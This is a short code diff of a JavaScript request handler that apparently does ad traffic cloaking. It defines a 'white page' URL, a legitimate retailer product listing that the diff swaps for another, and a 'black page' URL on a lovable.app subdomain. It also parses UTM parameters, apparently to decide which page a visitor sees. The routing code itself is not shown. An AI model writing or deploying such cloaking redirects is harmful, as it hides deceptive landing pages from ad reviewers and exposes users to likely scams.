@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/zwilling-trinkflasche-bottle-mit-fruchtsieb-zum-herausnehmen-fassungsvermoegen-ca-680-ml-bruchfestes-tritan-C1881291164/?variationId=1881291174";
+    const whitePageURL = "https://www.audioadvice.com/products/revelation-luxury-home-theater-seating-audio-advice?gad_source=1&gad_campaignid=20477190887&gbraid=0AAAAADRzHk99Ip29auKSs4IX9c76ypPZ2&gclid=Cj0KCQjwvJHIBhCgARIsAEQnWlD2xiDjLYE1XGOCL64Rxhzhzg5F44iA4OPlzLhOl9lD4HnslG__8BMaAs4oEALw_wcB";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
